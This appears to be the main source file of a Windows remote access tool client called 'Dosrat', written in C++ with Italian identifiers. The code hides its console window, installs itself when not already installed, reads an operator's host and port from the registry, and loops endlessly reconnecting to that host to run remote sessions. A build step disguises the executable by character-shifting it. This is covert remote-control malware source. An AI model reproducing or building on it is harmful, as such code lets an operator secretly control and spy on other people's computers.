#include <iostream>
#include <obfuscate.h>
#include <EssNet.h>
#include <Essentials.h>
#include <json.hpp>

using json = nlohmann::json;

string Version = "2.0.0-b.3";
int VersioneCompatibile = 1;
bool DEBUG = false;

#include "Classi.h"
#include "Funzioni.h"

using namespace std;

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    TcpIP Client;
    SystemUtils su;
    DirUtils du;
    Encode en;
    ConsoleUtils cu;
    Settaggi sett;
    EasyMSGB msgb;

    if (du.CheckFile(du.GetModuleFilePath() + "DosratDebug"))
        DEBUG = true;

    AllocConsole();
    if (!DEBUG)
        ShowWindow(GetConsoleWindow(), SW_HIDE);
    else
        freopen_s((FILE**)stdout, "CONOUT$", "w", stdout);

    if (du.CheckFile(du.GetModuleFilePath() + "SetBuild"))
    {
        en.CharShift(69, du.GetFullModuleFilePath(), du.GetModuleFilePath() + "ClientBuild.exe");
        return 0;
    }

    if (!du.CheckFile(du.GetModuleFilePath() + "LocTest"))
    {
        if (!IsInstalled())
        {
            short rtn = InstallClient();

            if(DEBUG)
                msgb.Ok("Codice installazione: " + to_string(rtn));

            return 0;
        }

        sett.GetSettingsFromReg();
    }
    else
    {
        sett.Host = "127.0.0.1";
        sett.Porta = 6969;
    }

    su.GetCPUload(); // Altrimenti con il GetInfo la prima volta da sempre il 6%

    Client.Host = sett.Host;
    Client.Port = sett.Porta;

    if (Client.StartClient() != 0)
    {
        Client.Stop();
        _getch();
        return 0;
    }

    for (bool i = true; i;)
    {
        while (!Client.Connect()) {}
        
        if (DEBUG)
            cout << "Ricevuta connessione" << endl;

        if (COMUNICAZIONI::Inizializzazione(Client.Sock))
        {
            if (DEBUG)
                cout << "Connessione accettata" << endl;

            switch (Sessione(Client))
            {
                case 0:
                    closesocket(Client.Sock);
                    break;

                case 1:
                    closesocket(Client.Sock);
                    Client.Stop();
                    return 0;
                    break;
            }

            if (DEBUG)
                cout << "Disconnesso" << endl;
        }
        Client.Stop();
        Client.StartClient();
    }

    return 0;
}